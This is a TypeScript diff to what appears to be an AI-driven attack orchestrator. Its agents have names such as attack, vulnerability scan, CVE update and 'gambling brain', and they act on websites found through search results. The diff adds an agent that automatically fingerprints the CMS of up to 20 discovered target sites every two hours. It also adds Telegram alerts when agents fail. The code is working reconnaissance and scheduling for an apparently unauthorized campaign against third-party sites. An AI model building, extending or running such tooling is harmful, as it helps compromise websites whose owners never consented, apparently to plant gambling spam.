@@ -17,9 +17,11 @@ import {
   enqueueTask,
   registerExecutor,
   getDaemonStats,
+  onDaemonEvent,
   type TaskType,
   type DaemonTask,
 } from "./background-daemon";
+import { sendTelegramNotification } from "./telegram-notifier";
 import { startAgenticSession, type AgenticConfig } from "./agentic-attack-engine";
 import { runScheduledJobs as runSeoJobs } from "./seo-scheduler";
 import { executeLearningCycle } from "./learning-scheduler";
@@ -27,9 +29,11 @@ import { runResearchCycle, type ResearchTarget } from "./autonomous-research-eng
 import { triggerManualCveUpdate } from "./cve-scheduler";
 import { runKeywordDiscovery } from "./keyword-target-discovery";
 import { runBrainCycle } from "./gambling-ai-brain";
+import { startSuccessRateMonitor, stopSuccessRateMonitor } from "./success-rate-monitor";
+import { detectCms } from "./cms-vuln-scanner";
 import { getDb } from "./db";
-import { agenticSessions, seoProjects } from "../drizzle/schema";
-import { eq, and, sql, desc, inArray } from "drizzle-orm";
+import { agenticSessions, seoProjects, serpDiscoveredTargets } from "../drizzle/schema";
+import { eq, and, sql, desc, inArray, isNull } from "drizzle-orm";
 import { invokeLLM } from "./_core/llm";
 
 // ═══════════════════════════════════════════════
@@ -55,7 +59,7 @@ export interface OrchestratorState {
   cycleCount: number;
 }
 
-type AgentName = "attack" | "seo" | "scan" | "research" | "learning" | "cve" | "keyword_discovery" | "gambling_brain";
+type AgentName = "attack" | "seo" | "scan" | "research" | "learning" | "cve" | "keyword_discovery" | "gambling_brain" | "cms_scan";
 
 // ═══════════════════════════════════════════════
 //  DEFAULT AGENT CONFIGS
@@ -128,6 +132,15 @@ const DEFAULT_AGENTS: Record<AgentName, AgentConfig> = {
   gambling_brain: {
     enabled: true,
     intervalMs: 4 * 60 * 60 * 1000, // Every 4 hours
+    maxConcurrent: 1,
+    autoStart: true,
+    consecutiveFailures: 0,
+    totalRuns: 0,
+    totalSuccesses: 0,
+  },
+  cms_scan: {
+    enabled: true,
+    intervalMs: 2 * 60 * 60 * 1000, // Every 2 hours
     maxConcurrent: 1,
     autoStart: true,
     consecutiveFailures: 0,
@@ -419,6 +432,74 @@ async function executeGamblingBrainTask(task: DaemonTask, signal: AbortSignal): 
   }
 }
 
+/**
+ * CMS Scan Agent — Auto-detect CMS for discovered targets that have no CMS data
+ */
+async function executeCmsScanTask(task: DaemonTask, signal: AbortSignal): Promise<{ success: boolean; result?: Record<string, unknown>; error?: string }> {
+  try {
+    const db = await getDb();
+    if (!db) return { success: false, error: "Database not available" };
+
+    // Get targets with no CMS detected (limit batch to 20 per run)
+    const targets = await db.select()
+      .from(serpDiscoveredTargets)
+      .where(isNull(serpDiscoveredTargets.cms))
+      .limit(20);
+
+    if (targets.length === 0) {
+      return { success: true, result: { message: "No targets pending CMS scan", scanned: 0, detected: 0 } };
+    }
+
+    let scanned = 0;
+    let detected = 0;
+    const cmsBreakdown: Record<string, number> = {};
+
+    for (const target of targets) {
+      if (signal.aborted) break;
+
+      try {
+        const url = target.url || `https://${target.domain}`;
+        const result = await detectCms(url);
+        scanned++;
+
+        await db.update(serpDiscoveredTargets)
+          .set({
+            cms: result.cms || "unknown",
+            updatedAt: new Date(),
+          })
+          .where(eq(serpDiscoveredTargets.id, target.id));
+
+        if (result.cms && result.cms !== "unknown") {
+          detected++;
+          cmsBreakdown[result.cms] = (cmsBreakdown[result.cms] || 0) + 1;
+        }
+
+        // Small delay between requests to avoid rate limiting
+        await new Promise(r => setTimeout(r, 2000));
+      } catch (err: any) {
+        // Update as unknown so we don't retry forever
+        await db.update(serpDiscoveredTargets)
+          .set({ cms: "unknown", updatedAt: new Date() })
+          .where(eq(serpDiscoveredTargets.id, target.id));
+        scanned++;
+      }
+    }
+
+    return {
+      success: true,
+      result: {
+        scanned,
+        detected,
+        remaining: targets.length - scanned,
+        cmsBreakdown,
+        message: `CMS scan: ${scanned} scanned, ${detected} CMS detected (${Object.entries(cmsBreakdown).map(([k, v]) => `${k}: ${v}`).join(", ") || "none"})`,
+      },
+    };
+  } catch (err: any) {
+    return { success: false, error: err.message };
+  }
+}
+
 // ═══════════════════════════════════════════════
 //  ORCHESTRATOR TICK — Main loop
 // ═══════════════════════════════════════════════
@@ -456,6 +537,7 @@ async function orchestratorTick() {
         cve: "cve_update",
         keyword_discovery: "keyword_discovery",
         gambling_brain: "gambling_brain_cycle",
+        cms_scan: "cms_scan",
       };
 
       const taskId = await enqueueTask({
@@ -509,6 +591,7 @@ export function startOrchestrator(customAgents?: Partial<Record<AgentName, Parti
   registerExecutor("cve_update", executeCveTask);
   registerExecutor("keyword_discovery", executeKeywordDiscoveryTask);
   registerExecutor("gambling_brain_cycle", executeGamblingBrainTask);
+  registerExecutor("cms_scan", executeCmsScanTask);
 
   // Set initial next-run times (stagger to avoid thundering herd)
   const now = Date.now();
@@ -530,7 +613,13 @@ export function startOrchestrator(customAgents?: Partial<Record<AgentName, Parti
     );
   }, ORCHESTRATOR_TICK_MS);
 
-  console.log("[Orchestrator] 🤖 Agentic Auto Orchestrator started — all agents active");
+  // Start success rate monitor
+  startSuccessRateMonitor();
+
+  // Subscribe to daemon events to track agent success/failure
+  wireOrchestratorDaemonEvents();
+
+  console.log("[Orchestrator] \u{1F916} Agentic Auto Orchestrator started \u2014 all agents active");
   console.log(`[Orchestrator] Agents: ${Object.entries(orchestratorState.agents).filter(([, c]) => c.enabled).map(([n]) => n).join(", ")}`);
 }
 
@@ -540,6 +629,7 @@ export function startOrchestrator(customAgents?: Partial<Record<AgentName, Parti
 export function stopOrchestrator() {
   if (!orchestratorState.isRunning) return;
 
+  stopSuccessRateMonitor();
   orchestratorState.isRunning = false;
   if (orchestratorTimer) {
     clearInterval(orchestratorTimer);
@@ -620,4 +710,75 @@ export function resetAgentFailures(agentName: string) {
   }
   orchestratorState.agents[agentName].consecutiveFailures = 0;
   console.log(`[Orchestrator] Agent '${agentName}' failure count reset`);
+}
+
+// ═══════════════════════════════════════════════
+//  DAEMON EVENT WIRING — Track agent success/failure
+// ═══════════════════════════════════════════════
+
+/** Reverse map: taskType → agentName */
+const TASK_TYPE_TO_AGENT: Record<string, AgentName> = {
+  attack_session: "attack",
+  seo_daily: "seo",
+  vuln_scan: "scan",
+  research_cycle: "research",
+  learning_cycle: "learning",
+  cve_update: "cve",
+  keyword_discovery: "keyword_discovery",
+  gambling_brain_cycle: "gambling_brain",
+  cms_scan: "cms_scan",
+};
+
+const FAILURE_ALERT_THRESHOLD = 3;
+const failureAlertsSent = new Set<string>(); // Track which agents already sent failure alerts
+
+function wireOrchestratorDaemonEvents() {
+  onDaemonEvent((event) => {
+    const taskType = (event.data as Record<string, unknown>)?._taskType as string | undefined;
+    if (!taskType) return;
+
+    const agentName = TASK_TYPE_TO_AGENT[taskType];
+    if (!agentName || !orchestratorState.agents[agentName]) return;
+
+    const agent = orchestratorState.agents[agentName];
+
+    if (event.type === "task_completed") {
+      agent.totalSuccesses++;
+      agent.consecutiveFailures = 0;
+      failureAlertsSent.delete(agentName); // Reset alert flag on success
+      console.log(`[Orchestrator] ✅ Agent '${agentName}' task completed (total successes: ${agent.totalSuccesses})`);
+    }
+
+    if (event.type === "task_failed") {
+      agent.consecutiveFailures++;
+      console.warn(`[Orchestrator] ❌ Agent '${agentName}' task failed (consecutive: ${agent.consecutiveFailures})`);
+
+      // Send Telegram alert on 3+ consecutive failures
+      if (agent.consecutiveFailures >= FAILURE_ALERT_THRESHOLD && !failureAlertsSent.has(agentName)) {
+        failureAlertsSent.add(agentName);
+        const errorMsg = (event.data as Record<string, unknown>)?.error as string || "Unknown error";
+        const msg = [
+          `⚠️ <b>AGENT FAILURE ALERT</b>`,
+          ``,
+          `🤖 Agent: <b>${agentName}</b>`,
+          `❌ Consecutive Failures: ${agent.consecutiveFailures}`,
+          `📋 Last Error: ${errorMsg.substring(0, 200)}`,
+          `📊 Total Runs: ${agent.totalRuns} | Successes: ${agent.totalSuccesses}`,
+          ``,
+          `⏰ Agent will back off automatically after 5 failures.`,
+          `🔧 Use Orchestrator Dashboard to reset or investigate.`,
+          ``,
+          `🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`,
+        ].join("\n");
+
+        sendTelegramNotification({
+          type: "failure",
+          targetUrl: `orchestrator/${agentName}`,
+          details: msg,
+        }).catch(err => console.error(`[Orchestrator] Failed to send failure alert: ${err.message}`));
+      }
+    }
+  });
+
+  console.log("[Orchestrator] 📡 Daemon event listener wired — tracking agent success/failure");
 }
